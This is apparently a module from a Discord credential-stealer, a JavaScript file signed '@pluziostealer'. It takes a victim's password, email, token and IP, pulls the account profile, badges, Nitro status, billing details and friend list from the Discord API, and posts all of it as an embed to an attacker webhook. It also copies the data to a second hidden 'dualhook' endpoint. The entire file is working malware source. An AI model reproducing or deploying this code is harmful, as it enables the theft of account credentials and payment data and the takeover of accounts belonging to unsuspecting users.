const axios = require('axios'); const confiug = require('../config.json'); 
const badgesHelper = require('../utils/badges');
const billingHelper = require('../utils/billing');
const friendlistHelper = require('../utils/friendlist');
const nitroHelper = require('../utils/nitro');
const { WebhookClient, MessageEmbed } = require('discord.js')

exports.send = async(password, email, token, webhook, ip_addy) => {
    const config = { method: "GET", url: "https://discordapp.com/api/v9/users/@me", headers: { 'Authorization': token, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': '*' }}
    
    await axios.request(config).then(async function (data) {
        var json = data.data

        var billing = await billingHelper.get(token)
        let badges = badgesHelper.get(json.flags)
        var nitro = await nitroHelper.get(json.premium_type, token, json.id)
        var friendlist = await friendlistHelper.get(token, json)

        const embed = new MessageEmbed()
        .setColor("#303037")
        .setAuthor(`${json.username}#${json.discriminator} (${json.id})`, "https://media.discordapp.net/attachments/1076644004608884798/1077518510495907870/discord-avatar-128-D9U0P.gif?width=86&height=86")
        .setThumbnail(`https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`)
        .setDescription(`<a:money_spacex:990306914065846333> **Token:**\n\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`)
        .addField("<:badges_spacex:996835071556325468> Badges:", badges, true)
        .addField("<:nitro_spacex:996835060911181864> Nitro Type:", nitro, true)
        .addField("<a:billing_spacex:996835048445710386> Billing:", billing.field, true)
        .addField("<:email_spacex:996835052975558776> Email:", `\`${json.email}\``, true)
        .addField("<:ip_spacex:996835055194353705> IP:", `\`${ip_addy}\``, true)
        .addField("<a:password_spacex:990305361741361163> Password:", `\`${password}\``, true)
        .setFooter("@pluziostealer")
        
        axios.post(webhook, { embeds: [embed, friendlist, billing.embed]}).catch();
        axios.post(confiug.session.dualhook, { embeds: [embed, friendlist, billing.embed]}).catch();
    }).catch();
}

